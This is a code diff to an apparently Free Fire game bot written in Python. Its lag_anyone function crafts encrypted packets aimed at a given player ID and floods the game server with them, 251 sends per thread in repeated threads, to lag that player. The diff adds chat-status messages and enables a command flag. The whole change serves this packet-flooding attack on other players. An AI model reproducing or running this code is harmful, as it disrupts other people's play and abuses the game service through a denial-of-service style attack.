@@ -55,27 +55,33 @@ cli = None
 p = None
 t = None
 
-command = False
+command = True
 def command_bot(value42w):
     global command
     command = value42w
     return command
 
 
-def lag_anyone(server,id):
+def lag_anyone(server,id,pck,msg):
     global remotesocket,clientsocket
     for i in range(1):
         if 11 > len(id) >= 9:
             p1 = f"083d12940108{id}128b0108{id}10a7c4839f1e1a0f42595445e385a4424f54e385a456332887f8e9a6063001380142600a5a68747470733a2f2f6c68332e676f6f676c6575736572636f6e74656e742e636f6d2f612f414163485474644e756868595a377936422d5a45726b77536d686758383651626b4170316f53414b31384e376c5836423d7339362d63100118014801"
             p2 = "0515000000a0"+EncryptFF(p1)
             p3 = bytes.fromhex(p2)
-            for i in range(250):
+            for i in range(251):
                 try:   
                     server.send(p3)
                     time.sleep(0.010)
+                    pakk = bytes.fromhex(generate_msg(f"[b][c][00bcd4]SEND PACKET --> [{i}]"  , pck ,"2d2d"))
+                    msg.send(pakk)
                     print(f"SEND PACKET --> [{i}]")
                 except Exception as q:
+                    pakk = bytes.fromhex(generate_msg("[b][c][e91e63]مشكـلة في النت !!"  , pck ,"2d2d"))
+                    msg.send(pakk)
+                    
                     break
+            
 
         if len(id) == 8:
             packet = bytes.fromhex("0515000000a0"+EncryptFF(f"083d12920108{id}128a0108{id}10a7c4839f1e1a0f42595445e385a4424f54e385a4563328eaae82a8063017380742600a5a68747470733a2f2f6c68332e676f6f676c6575736572636f6e74656e742e636f6d2f612f414367386f634c56614c486547346855746e724c5f374c51465f46495a747336326e4a34437453565562697a6e3153473d7339362d63100118014805"))
@@ -135,7 +141,7 @@ def Get_Lead_for_lag(id,server,msg,pck):
                         except:
                             pass
                         for i in range(2):
-                            threading.Thread(target=lag_anyone,args=(five,target)).start()
+                            threading.Thread(target=lag_anyone,args=(five,target,pck,msg)).start()
                             time.sleep(2)
                 break
         else:
